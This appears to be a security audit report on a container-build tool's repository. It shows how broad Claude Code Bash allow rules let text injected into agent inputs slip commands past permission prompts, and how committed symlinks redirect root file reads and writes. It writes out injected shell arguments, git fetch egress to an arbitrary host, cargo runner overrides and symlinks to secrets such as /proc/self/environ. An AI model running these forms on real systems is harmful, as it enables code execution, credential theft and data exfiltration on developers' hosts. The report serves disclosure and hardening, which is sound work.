title: Prefix-wildcard Bash allow rules approve cargo --config executables, git --upload-pack, git --output/--no-index, commit -F and arbitrary git fetch URLs, so injected text in agent inputs could run code, write and read host files and send data out without a prompt
description: The repository's checked-in .claude/settings.json approves whole command families by prefix: cargo build/check/test/clippy/doc * (:8-13), git diff/log/show * (:33-35), rg * (:39), git commit * (:41), git switch * (:42), git fetch * (:43), git pull --ff-only * (:44) and git branch * (:46). Among the allowlisted families the only option-level deny is Bash(rg *--pre*) (:68); the other option-level denies (rm *--no-preserve-root* at :63, git push --force and -f at :70-71) cover commands that are not allowlisted; the ask list is empty (:49, emptied in 06d5f7b under a docs(phase-1) commit message). Each rule's option grammar includes more than the build, test or read-only action it is meant to allow. Code execution with no file edit: cargo --config 'target.<triple>.runner=[...]', build.rustc-wrapper or doc.browser (with cargo doc --open), and git fetch/pull --upload-pack='<cmd>' with a local path, which git runs through sh. Foreign code: git fetch or git pull --ff-only from any URL or path, or git switch --detach FETCH_HEAD, brings attacker commits into the work tree, and the next cargo test runs their build.rs. Arbitrary file write: git log/diff/show --output=<absolute path>, for example a commit message turned into a cargo config.toml with a runner. Note that bash does not expand ~ after --output=, so an absolute path or $HOME is needed. Credential read: git diff --no-index /dev/null <file>, git commit -F <file> and rg '' <file> read the files that the Read deny rules (:72-75) name; those rules bind the Read tool only. Egress: git fetch https://<host>/<data> is unprompted. Lower-trust text reaches agents that run under this allowlist with Bash. red-team (tools Bash, Read, Write, Edit at red-team.md:4) is optionally given ../issue-mining cards (red-team.md:18-19). Those cards are triaged from upstream kaniko, BuildKit and buildah GitHub issue bodies, which any GitHub user writes. red-team also runs tests (:50) and commits (:53). bench-runner (bench-runner.md:4) reads the results of the W1-W3 workload builds, whose output includes that of third-party packages (inferred: the agent file does not name what it reads); its own just test-vm runs are not allowlisted, so it is a weaker path. reviewer (reviewer.md:15-18) is limited to read-only git only by its prompt, yet git diff/log/show --output and git fetch are not read-only. The main session and every subagent share this allowlist. The documented gate (workflow.md:149-151: ask before cargo run and git commit) does not match the settings: git commit is allowlisted at :41, and cargo test --config gives the effect of cargo run. No threat-model row, section 6 entry or ADR accepts this. rules.md:24-25 calls only the deny rules and the hook guardrails, not a sandbox. Scope of the increment: in acceptEdits mode, Edit plus cargo test already runs any code by design, so the code-execution variants matter mainly in default mode. The out-of-repository write, credential read and egress variants matter in both modes. The rule text and the option semantics are source-visible. Two facts are not: whether the installed Claude Code prompts for these forms despite a matching prefix rule, and whether injected instructions drive an agent to run them.
claimed_root_cause: In .claude/settings.json, Bash allow rules are command-prefix wildcards with no constraint on options or paths: cargo build/check/test/clippy/doc *, git diff/log/show *, rg *, git commit *, git fetch *, git pull --ff-only *, git switch * and git branch *. Their option grammar includes running a named executable or shell command, writing any path, reading any path, fetching from any URL and importing foreign commits. Only rg --pre is excluded, and the Read deny rules do not bind Bash subprocesses. Approval of these rules therefore does not bind the read-only or test action that the repository's docs say they allow.

The approved forms above can read the same credential files, run commands, write host files such as a cargo config, and send data to an arbitrary URL, all as the maintainer's account and with no prompt.

evidence.description: Bash(rg *--pre*) is the only option-level deny on an allowlisted family; rm *--no-preserve-root* (:63) and git push --force/-f (:70-71) cover commands that are not allowlisted. Option-level execution was handled for rg but not for cargo --config, git --upload-pack, git --output or --no-index.

The ask list is empty. Commit 06d5f7b removed ask rules for cargo run/add/install, ./target/*, docker, podman, git push/merge/rebase/reset --hard. Commands that are not allowlisted still prompt in default mode, so the allowlist is the only gate for the forms above.

The workflow says the settings ask before cargo add/install/run, docker, podman, git commit and git push (:149-151). In fact git commit * is allowlisted (settings.json:41, since 78e139e), and cargo test --config with a runner has the effect of cargo run.
The reviewer is held to read-only git by its prompt only (:15-18). git diff/log/show --output and git fetch are not read-only and are allowlisted.

The deny rules and the rustfmt hook are called guardrails, not a sandbox (:24-25). This instructs the agent; it does not accept that injected content may run allowlisted option forms, and no ADR or threat-model section 6 entry does either.

bench-runner has Bash under the same allowlist and reads the results of the W1-W3 workload builds, whose output includes that of third-party packages (inferred; the agent file does not name what it reads). Its own just test-vm runs are not allowlisted, which makes it a secondary ingestion path.

blockers: Claude Code's permission engine is closed source and not in the repository. Source cannot show whether, in the installed version, a matching Bash(prefix *) rule approves these option forms without a prompt. Built-in checks might force a prompt for some forms: path checks for rg, git diff --no-index or --output on paths outside the working directory; variable or tilde expansion; a quoted ';' inside --upload-pack; or a check of the Read deny rules (:72-75) against file paths named in a Bash command.

Two git behaviours are not stated in the local documentation and were not executed under the audit constraints: that git runs a --upload-pack value through sh for a local path, and that git log --output=<file> also receives the --format output (the man page lists --output among the diff options). The cargo options are documented locally (cargo-test.1 of 1.99.1: --config overrides any configuration value; the local stable cargo book, reference/config.html: target.<triple>.runner applies to cargo run, test and bench, build.rustc-wrapper replaces rustc, doc.browser is used by cargo doc --open), but were not run under 1.99.1.

The effective permission mode and settings are not in the repository: the gitignored settings.local.json, user settings, an OS sandbox, and whether auto mode keeps or strips these allow rules. Also not observable: whether an injected instruction in an issue-mining card or workload log actually makes an agent run one of these forms (action binding).

title: Allowlisted `just test *` and `just changelog *` splice their arguments unquoted into `bash -c`, so one argument can carry extra shell commands past the permission prompt
description: Mechanism (source-visible): .claude/settings.json:24 allows Bash(just test *) and :30 allows Bash(just changelog *). Every justfile recipe line runs through bash -euo pipefail -c (justfile:6), and justfile:32 (cargo test --workspace --locked {{ args }}) and :192 (git cliff --unreleased {{ args }}) insert the joined arguments as text. The justfile has no `set positional-arguments`, no `set export` and no quote(), and the comment at :30 says extra arguments go to cargo test, so options pass through by design. The README of just 1.59.0 in the local cargo registry documents both steps: a * variadic expands to its arguments joined by spaces (README.md:923-925), and the quotes the caller's shell used are not preserved when the line goes to the recipe shell (:1179-1196). So a single quoted argument such as 'zz_none || true; <cmd>' matches the prefix rule as one word, and bash then runs <cmd> as a further command whether cargo test succeeds or fails. Because the shell has -e, a payload after a bare `;` runs only if the command before it succeeds, and a bare `|| <cmd>` runs only if it fails; `|| true;` or `$( )` removes that dependence. For :192 a bare `||` suffices when git-cliff is missing (it is not on the PATH of this audit's shell). The approved object is a test name filter (CLAUDE.md:23, docs/testing.md:44) or a git-cliff draft; the executed object is arbitrary shell. Attacker: the author of lower-trust text that a Bash-capable project agent reads. The repository names one source: red-team (Bash, Write, Edit at red-team.md:4) is optionally given ../issue-mining cards derived from upstream issues (red-team.md:18-19, outside the repository), and runs and commits tests itself (:50, :53). Other sources: reviewer (Bash but no Write or Edit, reviewer.md:4) reads branch diffs (:19), and bench-runner (Bash, Read, Write) reads workload build output. Affected principal: a developer whose Claude Code session loads the committed settings and is not in bypassPermissions. The commands run as that user on the developer host without a prompt, including ones the deny list (settings.json:51-58) or the documented gate would stop. The size of the increment depends on the session's permission mode, which ed718fb does not fix: no committed settings file sets permissions.defaultMode and no committed agent sets a permissionMode. The gitignored .claude/settings.local.json (.gitignore:4), user or managed settings, the launch flag and mid-session switches decide it, and which mode the maintainer and other developers actually use is an owner-observed deployment fact (blocker 2). (1) In bypassPermissions every non-denied command already runs without a prompt, and the allow rule adds only evasion of the deny list, which rules.md:24-25 calls guardrails, not a sandbox, and which interpreter commands also reach. (2) In auto mode the session and its subagents are exposed exactly when auto mode honours this allow rule and skips the classifier (blocker 1). (3) Where file edits are auto-accepted (acceptEdits mode, or default mode after the developer allows all edits for the session), an agent with Write or Edit can already write a test or build script and run it with the allowlisted cargo test or just test. red-team is told to do exactly that (red-team.md:45-50). There this form adds only a payload that never appears in a file. The new capability is therefore for three cases: default-mode sessions whose edits are still prompted, Bash-only agents such as reviewer outside bypassPermissions, and auto-mode sessions if the allow rule skips the classifier. reviewer.md:15-18 forbids build and test only by instruction. For reviewer, a diff author who controls branch code already reaches allowlisted builds of that code (git switch * at settings.json:42, then just check at :20 or cargo check * at :9, which run build scripts). The increment there is for attacker text that is not buildable code in the tree. Related gaps: docs/agents/workflow.md:149-151 says settings.json asks before cargo run, docker, podman, git commit and git push, but :49 is ask: [] (emptied in 06d5f7b) and git commit is allowlisted (:41). Quoting alone does not close the issue. The arguments still reach cargo test options (--config target runner; Bash(cargo test *) at :10 allows the same directly, which is sibling claude-settings/allowlist-unconstrained-tool-options). They also reach git-cliff options (--config with a replace_command preprocessor, which git-cliff runs as a shell command; -o <path>). Smallest fix: drop the two free-argument allow rules and keep exact Bash(just test) and Bash(just changelog). Alternatively, use `set positional-arguments` and pass the filter as `-- "$@"`, so that no argument reaches cargo or git-cliff options; libtest's own options, such as the deprecated --logfile <path>, then remain reachable. Regression check: `just --dry-run test 'zz; echo X'` must not show `; echo X` as shell text.
claimed_root_cause: A prefix allow rule approves `just <recipe> <anything>`, but the recipe treats its variadic arguments as shell source: just interpolates {{ args }} textually into a bash -c line (justfile:6, :32, :192), so the permission matcher sees one quoted argument while bash parses it into several commands.

trace.description: red-team has Bash, Read, Write and Edit (:4). It is optionally given ../issue-mining/reports/summary.md and cards derived from upstream kaniko, BuildKit or buildah issues (:18-19), which are written by arbitrary third parties. The directory is outside the repository, on the maintainer's machine.

The agent runs its own tests, so the test command line is model-generated text built from content in its context, including those cards. In default mode its Write and Edit calls prompt until edits are allowed for the session; an allowlisted test run does not.

In default mode any `just test ...` string is approved without a prompt. bypassPermissions approves everything anyway. In auto mode it is unknown whether this rule skips the classifier (blocker 1). Whether Claude Code adds its own check for a quoted `;` or `||` is not source-visible either (blocker 1). A command inside one quoted argument is not a separate subcommand for the Bash deny rules (:51-58) to match. :30 does the same for just changelog.
`cargo test --workspace --locked {{ args }}`: the arguments are joined with spaces and inserted without quoting. :192 does the same for `git cliff --unreleased {{ args }}`.

bash parses the interpolated line, so `;`, `&&`, `||`, `|` and `$( )` from the original quoted argument run extra commands as the developer's user. Because of -e, a command after a bare `;` runs only if the cargo or git-cliff command before it succeeds, and a bare `||` runs its right side only when the left fails. `|| true;` and `$( )`, which runs before the command, do not depend on the first command's result.

evidence.description: Intended use: `just test <filter>`, a name filter across the workspace.
`just test <filter>` passes a name filter to cargo test. This is the action the allow rule is meant to approve.
The recipe comment says extra arguments go to cargo test, e.g. a name filter, so option-shaped arguments such as --config or --no-run are meant to reach cargo.
Second instance: `changelog *args` feeds `git cliff --unreleased {{ args }}` (:192). git-cliff also accepts --config, whose replace_command preprocessor runs a shell command, and -o <path>.

ask is empty (emptied in 06d5f7b), and git commit is allowlisted (:41). In default mode the commands that are not allowlisted still prompt, so the gate rests on the allowlist that this argument form bypasses.

.claude/settings.local.json is gitignored. No committed settings file or agent sets a permission mode, so the mode a developer's session runs in (and any extra ask or deny rules) lives outside ed718fb and is an owner-observed deployment fact.

States that settings.json denies sudo, mount and unshare, and asks before cargo add/install/run, docker, podman, git commit and git push (:149-151). The ask part is stale, and an injected command reaches all of these without a prompt.

The deny rules and the hook are guardrails, not a sandbox. Under bypassPermissions, evading the deny list through this form is therefore not a finding by itself. The finding depends on sessions where the allowlist is the approval gate: default mode, and auto mode if the allow rule skips the classifier.

Push, open a PR or merge only when the maintainer asks (:15: never sudo, unshare, nsenter). These are stated non-approvals that an injected command would bypass in a session where the allowlist is the gate.

Bash(cargo test *) is also allowlisted, and `just test --config ...` reaches cargo too. Fixing only the quoting leaves code execution through the cargo target runner, which is tracked as claude-settings/allowlist-unconstrained-tool-options.

reviewer has Read, Grep, Glob and Bash but no Write or Edit, and reads branch diffs (:19). Its Bash use is limited to read-only git and graphify commands by instruction only (:15-18). Without Write or Edit, its main unprompted route to arbitrary commands outside bypassPermissions is an allowlisted command that takes free arguments, if the session's mode honours the rule. A diff author who controls branch code can already have it built through allowlisted commands (git switch *, just check), so the increment is for attacker text that is not buildable code.

red-team writes its attacks as tests, at tier T0 where that can show them, and runs them (:45-50). With edits auto-accepted, writing a test and running the allowlisted cargo test or just test already executes arbitrary code, so for this agent the increment is limited to sessions whose edits still need approval.

blockers: It is not source-visible whether the installed Claude Code version auto-approves `just test 'zz_none || true; <cmd>'` under Bash(just test *) in default mode, or whether its built-in command-injection checks force a prompt for a quoted argument that contains `;` or `||`. For auto mode it is also unknown whether this allow rule is honoured and skips the classifier, or is dropped or overridden, so that the classifier reviews the injected command.

Deployment (owner-observed, not in ed718fb): which permission mode the maintainer's and other developers' sessions in this repository run in. No committed file sets it; the gitignored .claude/settings.local.json, user or managed settings, the --permission-mode flag or a mid-session switch can, and user or managed settings can also add ask or deny rules that override the committed allow rules. The same holds for whether sessions on the maintainer's host, a contributor's clone, the VPS lane or other hosts run in default or auto mode while edits still need approval, whether they run a Bash-only agent such as reviewer, and whether red-team is given ../issue-mining cards there. A session left in bypassPermissions gains only deny-list evasion. Where edits are auto-accepted, Write-capable agents already run arbitrary code through allowlisted test runs.

Use a throwaway Claude Code login, an empty CLAUDE_CONFIG_DIR (no user settings), no SSH agent, no ~/.docker and no git push credentials. (2) Start Claude Code in the clone with `--permission-mode default` and, before allowing any file edit, ask it to run exactly `just test '--no-run || true; touch /tmp/rnk-allowlist-marker'`. If the account does not offer auto mode, record that this step was not run. (5) Remove the markers again. Have the reviewer subagent (no Write or Edit) run the step-2 command, first in auto mode and then after a restart with `--permission-mode acceptEdits`. title: A Dockerfile path that exists as given is read on the host through a context-owned symlink, and the target's first token is printed in the parse error
description: dockerfile_source (crates/ranikust/src/build.rs:561-568) picks DockerfileSource::Host when --dockerfile is absolute, or when it is relative and Path::exists (which follows symlinks) finds it from the current directory. It does not check whether the path lies inside the build context. read_dockerfile (build.rs:592) then opens the path as root with std::fs::File::open, which follows every symlink. Two operator invocations reach this route with a path inside the context: an absolute --dockerfile into the checkout (the kaniko/GitLab form --dockerfile=$CI_PROJECT_DIR/Dockerfile, which the book says carries over), and the default --dockerfile=Dockerfile run with the current directory at the context. If the lower-trust context owner commits Dockerfile as a symlink to a root-readable host file, ranikust reads that file as the Dockerfile. The parser keeps the first blank-delimited token of the first non-empty, non-comment line as the keyword, unchanged (parser.rs:476, 739). Blanks are space, tab, VT, FF and CR; NUL and ':' are not. instructions.rs:516 rejects it as 'unknown instruction: <token>', and the user sees 'ranikust: error: Dockerfile line 1: unknown instruction: <token>' on stderr, uncut (main.rs:166,180). The same text goes into the --metrics-file exit.message, cut to 500 characters (report.rs:25,73). Contents that fit in one token leak whole, such as a service-account JWT, a ~/.git-credentials URL or a /etc/shadow entry. From /proc/self/environ the leak runs up to the first blank and may include DOCKER_AUTH_CONFIG. Source-visible limits: nothing leaks if any line of the target is 64 KiB or longer (parser.rs:215, 985-990), if the target is not UTF-8 (read_to_string fails with only the path), if the first token happens to be a valid keyword, or if a later line starts with a known keyword whose arguments do not parse or opens an unterminated heredoc (parse_ast fails on that line first, parser.rs:937, 958). None of these applies to the single-line or keyword-free example targets. Where the boundary is crossed: in Full-isolation modes (overlay, kaniko per-stage directories), RUN cannot reach host files, so this is a new host-file read. In kaniko mode on a container's '/', RUN can already read the container's files (threat-model section 6 accepts this), so the only new reach there is ranikust's own /proc/self/environ, which T21/ADR-0051 keeps from RUN. The FIFO hang and /dev/zero memory growth, from the same read having no O_NONBLOCK, type check or size cap, give nothing a hostile RUN cannot already do; they are hardening, not a boundary effect. Commit 81dd085 closed only the not-found route, and only that route is tested (build.rs:1916-1937). The sibling <Dockerfile>.dockerignore read uses O_NOFOLLOW|O_NONBLOCK and a regular-file check (rnk-context source.rs:211,227). No ADR or threat-model section 6 entry accepts following symlinks on the host route. kaniko's resolveDockerfilePath, which the code comment cites, has the same pattern; that is calibration only. Fix: make the absolute path lexically, canonicalising only the operator's working directory. If it lies under the context origin, read the remainder through context.root().open_regular (RESOLVE_IN_ROOT). Otherwise open it with O_NOFOLLOW|O_NONBLOCK, require a regular file and cap its size. Add a test for the Host route next to build.rs:1916.
claimed_root_cause: dockerfile_source (crates/ranikust/src/build.rs:561-568) sends any absolute path, or any relative path that Path::exists finds through symlinks from the current directory, to DockerfileSource::Host. It does not ask whether the path lies inside the lower-trust build context. read_dockerfile (build.rs:592) then reads that path with std::fs::File::open, which follows every symlink, so a symlink the context owner committed sends a root read to any host file. This breaks rules.md:21 and threat-model.md:43 (code that reads the Dockerfile treats it as hostile). The parse error built at instructions.rs:516, from the keyword kept as written at parser.rs:476 and 739, carries the file's first token to stderr and the metrics report.

trace.description: --dockerfile defaults to the relative path 'Dockerfile' (--context defaults to /workspace/ at cli.rs:77). The trusted operator supplies only the path string. When that path lies inside the build context, the lower-trust context owner controls what is there, including a symlink.

The path is copied unchanged ('The Dockerfile path as given; resolved against the context later', config.rs:145). Nothing ties it to the context, and ranikust never changes its working directory before the read.

is_absolute() || exists(). exists() stats the path from the current directory and follows symlinks, so with the current directory at the context a symlinked Dockerfile whose target exists picks Host; an absolute path always picks Host. std::path::absolute does not resolve symlinks.

std::fs::File::open(p) then read_to_string follows final and intermediate symlinks, with no O_NOFOLLOW, O_NONBLOCK, regular-file check or size cap. It runs as root in prepare (build.rs:395-396), before any RUN, in every mode.

rnk_dockerfile::parse(&text) runs on the host file's contents, and the error becomes the build's failure message through to_string(). It reaches main unchanged (build.rs:340-345; main.rs:363 in overlay mode, main.rs:452 in kaniko mode).

The keyword is the first token up to an ASCII blank (is_ascii_blank: tab, VT, FF, CR, space). It is stored as written in Node.keyword (parser.rs:739), not lower-cased. An unknown keyword keeps one empty argument and its line parses without error. parse_ast as a whole still fails first, without the token, if some line is 64 KiB or longer (parser.rs:215, 985-990), or if a later line starts with a known keyword whose arguments do not parse or opens an unterminated heredoc (parser.rs:937, 958).
An unknown keyword yields format!("unknown instruction: {}", node.keyword). from_ast wraps it with the node's lines, which error.rs:105 prints as 'Dockerfile line 1: ...'.

report(&failure.message) writes 'ranikust: error: <message>' to stderr uncut (main.rs:180). Outcome::error stores the same message as the metrics report's exit.message (main.rs:169, rnk-metrics report.rs:73), cut to 500 characters (report.rs:25).

evidence.description: Design comment on DockerfileSource::Host: 'A path the operator gave that exists as given: read on the host.' A path that exists as given may still lie inside the context.

Test a_dockerfile_not_found_as_given_is_read_inside_the_context asserts that a symlinked file's 'SECRET first line' never reaches the error, but only for DockerfileSource::Context. Its Host assertion (build.rs:1921-1924) checks only the routing of '/abs/Dockerfile', so the same symlink on the Host route is untested.
Crate card, from commit 81dd085: 'A Dockerfile not found as given is read inside the context through its RootPath, never by a host path.' A Dockerfile found as given has no equivalent control.

The Dockerfile and the build context are inputs the operator decides to build, and 'ranikust's own code that reads them (parser, COPY, .dockerignore) treats them as hostile'. T1 at line 78 says never to join strings onto a host path. Section 6 (lines 100-158) accepts no host-route symlink read.
Every path from an image, a build context or a Dockerfile is untrusted: reach it only through rnk_rootfs::RootPath, never std::fs or Path::join onto a host path.

Sibling control: read_beside_dockerfile opens <Dockerfile>.dockerignore with O_NOFOLLOW|O_NONBLOCK and requires a regular file (line 227). The Dockerfile itself, read first through the same host path, has neither.

The documented invocation is '--context=/workspace --dockerfile=Dockerfile', and the book says the flags of a kaniko job carry over. The relative path is resolved from the working directory, which may be the context; usage.md:64 says nothing about how --dockerfile is resolved.
The stated invariant on the error message: it 'must not hold secrets, like every error ranikust prints'.

main sets PR_SET_DUMPABLE 0 (ADR-0051, T21) so that a RUN cannot read /proc/<ranikust>/environ. ranikust's own open of /proc/self/environ through the symlink is in its own thread group, which the kernel's ptrace access check exempts.

blockers: Target-controlled execution is not allowed in this run: no cargo, no tests and no ranikust binary, and this host has no OS-enforced sandbox; the VM and T2c lanes have external network. So neither the host read through the symlink nor the echoed error text has been observed. Source makes the message deterministic for a single-line UTF-8 target under 64 KiB.

Deployment facts outside the source decide whether the boundary is crossed: whether operators start ranikust with the working directory at the context or pass an absolute --dockerfile into it, and whether a context author who cannot edit the job's own configuration can read the job's stderr or metrics report. A context author who can edit the CI config already runs commands in the job, and then nothing is crossed.

Kernel and runtime facts not observed: that a non-dumpable root ranikust reads its own /proc/self/environ, and the environment order that decides how much of DOCKER_AUTH_CONFIG comes before the first blank. This matters for the kaniko-on-'/' mode, where the environ is the only new reach.

validation_plan.local: 1) T0 unit test (no root, no network, dummy data), next to build.rs:1916. Make a tempdir context ctx and an outside NamedTempFile holding 'DUMMYTOKEN-abc.def:x\n', then symlink ctx/Dockerfile to it. Assert that dockerfile_source(&ctx.path().join("Dockerfile")) == DockerfileSource::Host(..). Open context = rnk_context::open(&ContextSpec::Dir(ctx.path().to_owned())), read text = read_dockerfile(&src, &context).unwrap(), and take e = rnk_dockerfile::parse(&text).unwrap_err().to_string(). Expected today: e == 'Dockerfile line 1: unknown instruction: DUMMYTOKEN-abc.def:x'; after the fix, e and any read error must not contain DUMMYTOKEN. Add a FIFO target (nix/rustix mkfifo in the tempdir) and require the read to return an error without blocking, under a 5 s test timeout. Run: cargo test -p ranikust a_dockerfile_symlink_in_the_context_is_not_followed_by_a_host_path. 2) T2 disposable VM, the Full-isolation case that crosses a boundary, as root in overlay mode with a fresh --state-dir. Create a root-only dummy with 'printf DUMMYHOSTSECRET-123 > /root/dummy-secret; chmod 600 /root/dummy-secret', make /tmp/ctx and 'ln -s /root/dummy-secret /tmp/ctx/Dockerfile'. Run (a) 'cd /tmp/ctx && ranikust --context=/tmp/ctx --no-push --state-dir=/tmp/rnk-state-a --metrics-file=/tmp/ma.json' and (b) 'cd / && ranikust --context=/tmp/ctx --dockerfile=/tmp/ctx/Dockerfile --no-push --state-dir=/tmp/rnk-state-b --metrics-file=/tmp/mb.json'. Expect stderr 'ranikust: error: Dockerfile line 1: unknown instruction: DUMMYHOSTSECRET-123' and the same text in exit.message of both reports. Control: (c) 'cd / && ranikust --context=/tmp/ctx --dockerfile=Dockerfile ...' must take the Context route and not print DUMMYHOSTSECRET. 3) T2c throwaway rootful Docker with the ADR-0063 marker, --network none and no host volume (kaniko mode on '/'). Inside, 'ln -s /proc/self/environ /workspace/Dockerfile' and run 'cd / && env -i DOCKER_AUTH_CONFIG=DUMMYAUTH PATH=/usr/local/bin:/usr/bin:/bin ranikust --context=/workspace --dockerfile=/workspace/Dockerfile --no-push'. Check whether stderr contains 'DOCKER_AUTH_CONFIG=DUMMYAUTH'. That shows the non-dumpable self-read and the leak of the environ prefix.
validation_plan.deployment: The owner checks the CI templates and build services that call ranikust. Is it started from the checkout directory (GitLab $CI_PROJECT_DIR, GitHub $GITHUB_WORKSPACE, Tekton workspace), or with an absolute --dockerfile into the checkout? Is the job definition protected from the authors of the built context (fork MRs/PRs, a build-as-a-service tenant)? Can those authors read the job log or the uploaded metrics report? If any of these answers is no, the finding falls to hardening.

title: Overlay and per-stage kaniko modes: root resolves operator output paths by name, so a symlink the build-context owner commits at a digest-file leaf truncates or creates a host file, and a symlinked parent redirects the tar, OCI layout and metrics outputs
description:
Scope: overlay mode and kaniko mode with per-stage directories, where RUN runs under Isolation::Full. Kaniko mode on a container's / (Direct) is excluded because a RUN reaches those paths itself (fingerprint ranikust/direct-slash/operator-paths-followed-with-retained-caps).

Who can plant the link: RUN cannot. It never sees the host context, because RUN --mount=type=bind/tmpfs/ssh is refused (crates/rnk-builder/src/mounts.rs:171-176). The ranikust process writes the outputs as root after the last RUN. It runs in its own mount namespace (unshare NEWNS with / a recursive slave, crates/rnk-sandbox/src/setup.rs:35-44), which resolves paths against the host's files. So the lower-trust principal is the build-context owner, for example the author of a pull request or of a third-party repository whose checkout is --context. This needs the operator to put an output path, or one of its parents, inside the context: a relative --digest-file, --tar-path, --oci-layout-path or --metrics-file run from the checkout, or an absolute path under it. A symlink committed to git is enough; no race is needed. If the context owner also writes the job's command line, as with a .gitlab-ci.yml in the same repository, nothing is crossed.

Variant A, the leaf is followed: write_digest_files (crates/ranikust/src/build.rs:734-788, called at build.rs:940 for --digest-file, --image-name-with-digest-file and --image-name-tag-with-digest-file) opens the path write|create|truncate, mode 0644, with no O_NOFOLLOW (build.rs:747-752). A committed `digest.txt -> /some/host/file` makes root truncate that file and write `sha256:<hex>` into it. The name files get `repository[:tag]@sha256:<hex>` lines built from the operator's --destination values. A dangling link makes root create its target, as long as the target's directory exists. The recursive DirBuilder (build.rs:741-745) also follows a parent link that points to an existing directory and makes missing directories below it, mode 0700.

Variant B, parents are followed: write_oci_layout's create_dir_all(dir) (crates/rnk-builder/src/output.rs:137) follows a link at the layout directory itself or at any parent. So do put_blob's create_dir_all (output.rs:393), write_atomically's tempfile_in(parent) (output.rs:461) and persist(path) (output.rs:472), and rnk-metrics report::write_file's create_dir_all and rename (crates/rnk-metrics/src/report.rs:365, 382). A committed `out -> /some/host/dir` therefore makes root create or replace files in that existing host directory: the tar under the operator's leaf name, index.json, oci-layout, blobs/sha256/<hex> and the metrics JSON. A committed `layout/blobs/sha256 -> /some/host/dir` inside an operator layout directory that lies in the context does the same for the blobs alone; their bytes are config and layer blobs the Dockerfile author shapes. Variant B replaces its leaf by rename and does not follow it.

Controls checked, none of which stops this:
- Overlay mode calls build::run with no output-path check (crates/ranikust/src/main.rs:353-363).
- Per-stage kaniko mode only refuses paths whose physical form lies under the stages directory; every other path hits the `continue` at main.rs:708-709.
- The paths are made absolute lexically (crates/ranikust/src/config.rs:458-462, 639-643; metrics at main.rs:191) and are never compared with the context (config.rs:410).
- fs.protected_symlinks and fs.protected_regular apply only in sticky world-writable directories, so not in a checkout.

Sibling writers resist part of this: output.rs:441-443 and report.rs:375-376 write through an exclusively created temporary file renamed over the leaf, so a planted leaf is replaced rather than followed; neither checks the parents. write_digest_files has not even that. The --dockerfile precedent is only partial: dockerfile_source (build.rs:561-566) reads an absolute path, or a relative one that exists from the current directory, on the host with std::fs::File::open (build.rs:592), which follows a committed symlink. That includes the default 'Dockerfile' when ranikust runs from the checkout. Only a relative path not found as given is read through the context root 'so a symlink there never leaves the context' (build.rs:554-555, test at build.rs:1929-1937). So in this finding's own scenario the project's --dockerfile read also trusts a context-owned object at an operator path; that read-side behaviour is a separate root cause and is not part of this record.

Calibration: kaniko writes its digest files by path too (build.rs:735 cites push.go). That shares the pattern but does not dismiss the finding.

Policy: threat-model.md:42 and rnk-builder lib.rs:23-24 trust operator output paths ('typing mistakes, not intent'). threat-model.md:205-207 excludes anything that needs a dangerous flag passed knowingly. On the other side, threat-model.md:43 and rules.md:21-23 make context content hostile, and rules.md:31-32 allows writes only to the outputs. No section 6 entry or ADR decides what happens to context-owned objects at an operator-typed output path, so the behaviour is not explicitly accepted.

Impact if the policy counts it: the integrity and availability of A1. Root can destroy or create any host file with fixed digest text (variant A), and can create or replace files in any existing host directory, with fixed or operator names and image-derived bytes (variant B). No placement here is shown to give code execution. Minor: the leaf is also opened without O_NONBLOCK, so a FIFO there blocks the build; git cannot commit a FIFO, so only a local context owner can plant one.
claimed_root_cause: The output writers resolve the whole operator output path on the host, by name, as root: std::fs DirBuilder, create_dir_all, OpenOptions, tempfile_in and rename. They assume every component belongs to the operator (rnk-builder lib.rs:23-24, output.rs:6-7, build.rs:736). Nothing checks whether a component lies in the lower-trust build context or who owns it. write_digest_files also opens its leaf with O_CREAT|O_TRUNC and no O_NOFOLLOW, unlike its sibling writers (output.rs:441-443, report.rs:375-381), which replace the leaf by rename instead of following it. So a symlink the context owner commits at the leaf or at a parent redirects a root write to any host path.

trace.description: The operator types --digest-file. The same holds for --image-name-with-digest-file (:179), --image-name-tag-with-digest-file (:183), --tar-path (:141), --oci-layout-path (:145) and --metrics-file (:41). The string is trusted. When it names a location inside the checked-out context, the context owner controls what its components are on disk, a committed symlink included. That is the lower-trust input, and the kernel resolves it at the sink.
The digest-file paths are made absolute lexically by absolute() (config.rs:639-643), which resolves no symlink. Nothing checks ownership or compares the path with the context (config.rs:410).

Overlay mode passes the config to build::run with no output-path check. Per-stage kaniko mode runs paths_outside_the_root (main.rs:568), which refuses only paths under the stages directory and skips every other one with the continue at main.rs:708-709.
After every stage and RUN has finished and the image is assembled, the ranikust process, as root, calls write_digest_files. It runs before the OCI layout (943), the tar (946) and the push.
A recursive DirBuilder, mode 0700, is run on the parent. It follows a symlinked parent that points to an existing directory and creates any missing directories below the link's target.

OpenOptions write|create|truncate, mode 0644, then .open(path), with no O_NOFOLLOW, no O_NONBLOCK and no type or owner check. It follows a symlink at the leaf, truncates the target and writes the digest text (build.rs:754), or creates the target when the link dangles.

evidence.description: RUN --mount=type=bind/tmpfs/ssh is refused, so under Isolation::Full RUN never sees the host context. Only the context owner, never RUN, can plant links there.
enter_build_namespace: ranikust's own process does unshare(NEWNS) and makes / a recursive slave (40-44). Output paths still resolve against the host's files.

write_oci_layout: create_dir_all(dir) follows a link at the layout directory or at any parent. write_new (429-434) and put_blob (387-406, create_dir_all at 393) then place oci-layout, index.json and blobs/sha256/<hex> there.
write_atomically: tempfile_in(parent), then persist(path) at 472. Parent links are followed, and the leaf is replaced by rename rather than followed. --tar-path and every layout file go through it.

report::write_file: create_dir_all(dir), then rename(tmp, path) at 382, so --metrics-file parents are followed. The path is made absolute at crates/ranikust/src/main.rs:191 and written on every exit by collector.rs:170.
Stated property of the sibling writer: 'nothing planted beside the output is followed or overwritten' (commit 1470d18: 'a planted name is never followed').
Sibling control: create_new is used to 'never truncate or follow a file that is already there, a symlink included'. write_digest_files lacks it.

DockerfileSource::Context reads a --dockerfile through the context root 'so a symlink there never leaves the context' (test at 1929-1937). It applies only to a relative path not found from the current directory; the output writers have no equivalent.

dockerfile_source returns DockerfileSource::Host for an absolute path or a relative path that exists as given, such as the default 'Dockerfile' run from the checkout; read_dockerfile opens it with std::fs::File::open (592), following a committed symlink. The --dockerfile precedent therefore does not show that the project already distrusts context-owned objects at operator-typed paths.
The only planted-name test covers the tar's temporary name. No test covers a symlinked leaf or parent of any output. The digest-file test at build.rs:2070 uses plain paths only.

The writer's assumption: 'These are operator paths, not the image's'. It does not consider paths that lie in the context. Line 735 cites kaniko's push.go, which writes by path too: the baseline shares the pattern.
Boundary: 'Output paths come from the command line and are trusted'.
Operator output paths are trusted: ranikust protects against typing mistakes, not intent.
